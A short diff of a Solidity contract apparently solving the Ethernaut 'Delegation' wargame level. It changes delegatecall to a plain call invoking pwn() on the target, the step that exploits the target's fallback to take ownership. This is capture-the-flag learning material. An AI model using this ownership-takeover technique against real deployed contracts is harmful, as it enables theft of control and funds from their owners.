@@ -38,7 +38,7 @@ contract Delegatoor {
 
     function sendWithData(address $your_ethernaut_address_here) public returns (bool) {
         Delegation delegation = Delegation($your_ethernaut_address_here);
-        (bool success,) = address(delegation).delegatecall(abi.encodeWithSignature("pwn()"));
+        (bool success,) = address(delegation).call(abi.encodeWithSignature("pwn()"));
         require(success);
     }
 }
